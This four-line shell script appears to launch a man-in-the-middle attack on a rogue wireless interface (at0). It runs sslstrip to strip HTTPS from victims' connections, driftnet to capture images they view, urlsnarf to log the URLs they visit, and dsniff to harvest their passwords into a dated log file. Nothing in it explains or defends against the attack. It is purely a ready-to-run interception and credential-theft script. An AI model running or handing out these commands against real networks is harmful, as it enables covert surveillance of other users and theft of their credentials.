xterm -e sslstrip -a -k -f &
driftnet -v -i at0 &
xterm -e urlsnarf -i at0 &
xterm -e dsniff -m -i at0 -d -w dsniff$(date +%F-%H%M).log & 
